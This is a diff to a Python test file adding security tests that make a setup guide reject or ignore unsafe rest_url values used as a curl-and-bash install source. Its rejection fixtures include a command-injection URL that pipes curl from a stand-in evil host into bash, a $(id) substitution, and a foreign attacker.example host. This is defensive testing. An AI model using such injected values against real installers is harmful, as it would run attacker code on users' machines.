@@ -68,7 +68,13 @@ def test_guide_explains_mcp_zero_config_mode():
     assert "kb_ingest_session" in guide  # the tool the MCP-mode flush hook calls
 
 
-def test_guide_substitutes_rest_url():
+def test_guide_substitutes_rest_url(monkeypatch):
+    from kbcore.config import settings
+
+    # A caller-supplied rest_url is honored only when its host is allowlisted — it
+    # becomes a curl|bash install source, so a foreign host is ignored (see the
+    # security tests below). Allowlist this one for the substitution path.
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "api.myhost.internal")
     guide = tools_setup.build_setup_guide(rest_url="https://api.myhost.internal/")
     # the step-3 config block uses the caller's URL (trailing slash trimmed).
     # (install.sh's own embedded REMOTE stub keeps its generic placeholder — the
@@ -83,9 +89,69 @@ def test_guide_falls_back_to_configured_public_rest_url(monkeypatch):
     guide = tools_setup.build_setup_guide()  # no arg -> use the configured base
     assert "KB_REST_URL=https://api.configured.host" in guide
     assert "you only need to add" in guide  # "token only" hint when pre-filled
-    # explicit arg still overrides the configured default
+    # explicit arg still overrides the configured default — when its host is
+    # allowlisted (a foreign host is ignored; see the security tests below).
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "api.override.host")
     g2 = tools_setup.build_setup_guide(rest_url="https://api.override.host")
     assert "KB_REST_URL=https://api.override.host" in g2
+
+
+# --- rest_url is a fetch-and-execute target: validate + host-gate it ----------
+# The bootstrap block exports the live kbe_ code as a bearer, curls install.sh
+# from $KB_REST_URL and runs `bash install.sh`. So a caller-supplied rest_url
+# decides WHERE a new machine downloads-and-runs its installer: it must be https,
+# metacharacter-free, and pointed at the configured host or an allowlisted one.
+
+
+def test_a_metacharacter_rest_url_is_rejected(monkeypatch):
+    """A non-https or shell-metacharacter rest_url never reaches interpolation."""
+    from kbcore.config import settings
+    from kbcore.errors import InvalidOperation
+
+    monkeypatch.setattr(settings, "kb_public_rest_url", "")
+    for bad in (
+        "http://evil.host",  # not https
+        "https://evil.host/x;curl evil.sh|bash",  # shell metacharacters
+        "https://evil.host/$(id)",
+        "https://evil.host x",  # embedded whitespace
+        "ftp://evil.host",
+        "not a url at all",
+    ):
+        with pytest.raises(InvalidOperation):
+            tools_setup.build_setup_guide(rest_url=bad)
+
+
+def test_a_wellformed_but_foreign_rest_url_is_ignored_not_interpolated(monkeypatch):
+    """A perfectly-formed https URL whose host is neither configured nor allowlisted
+    is DROPPED — the configured value renders instead, so an attacker host can never
+    become the install source."""
+    from kbcore.config import settings
+
+    monkeypatch.setattr(settings, "kb_public_rest_url", "https://api.configured.host")
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "")
+    guide = tools_setup.build_setup_guide(rest_url="https://evil.attacker.example")
+    assert "evil.attacker.example" not in guide, "a foreign host was interpolated"
+    assert "KB_REST_URL=https://api.configured.host" in guide
+
+
+def test_the_configured_host_is_always_honored_as_an_override(monkeypatch):
+    """The configured kb_public_rest_url host needs no allowlist entry to be used
+    as an explicit rest_url (a different path on the same host is fine)."""
+    from kbcore.config import settings
+
+    monkeypatch.setattr(settings, "kb_public_rest_url", "https://api.myhost.example")
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "")
+    guide = tools_setup.build_setup_guide(rest_url="https://api.myhost.example/base")
+    assert "KB_REST_URL=https://api.myhost.example/base" in guide
+
+
+def test_an_allowlisted_host_is_honored(monkeypatch):
+    from kbcore.config import settings
+
+    monkeypatch.setattr(settings, "kb_public_rest_url", "")
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "a.internal, api.trusted.example")
+    guide = tools_setup.build_setup_guide(rest_url="https://api.trusted.example")
+    assert "KB_REST_URL=https://api.trusted.example" in guide
 
 
 def test_guide_explains_oauth_only_connector_mode():
@@ -95,9 +161,13 @@ def test_guide_explains_oauth_only_connector_mode():
     assert "spends Claude usage" in guide  # the honest cost caveat
 
 
-def test_kb_setup_registered_and_callable():
+def test_kb_setup_registered_and_callable(monkeypatch):
     from fastmcp import Client, FastMCP
 
+    from kbcore.config import settings
+
+    # rest_url is honored only for an allowlisted host (fetch-and-execute source).
+    monkeypatch.setattr(settings, "kb_setup_allowed_rest_hosts", "api.x.test")
     mcp = FastMCP(name="kb-test")
     tools_setup.register(mcp)
 
